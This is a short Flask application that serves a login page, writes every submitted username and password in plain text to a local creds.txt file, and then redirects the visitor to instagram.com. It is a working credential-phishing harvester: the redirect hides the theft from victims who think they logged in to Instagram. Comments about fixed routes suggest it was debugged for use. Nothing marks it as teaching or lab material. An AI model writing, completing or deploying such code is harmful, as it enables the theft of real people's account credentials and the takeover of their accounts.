
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/")
def login():
    return render_template("login.html")

@app.route("/submit", methods=["POST"])  # Fixed route
def submit():
    username = request.form["username"]
    password = request.form["password"]

    with open("creds.txt", 'a') as f:
        f.write(f"username : {username}, password : {password}\n")  # Fixed newline

    return redirect("http://instagram.com")  # Optional: add `code=302` if needed

if __name__ == "__main__":
    app.run(debug=True)
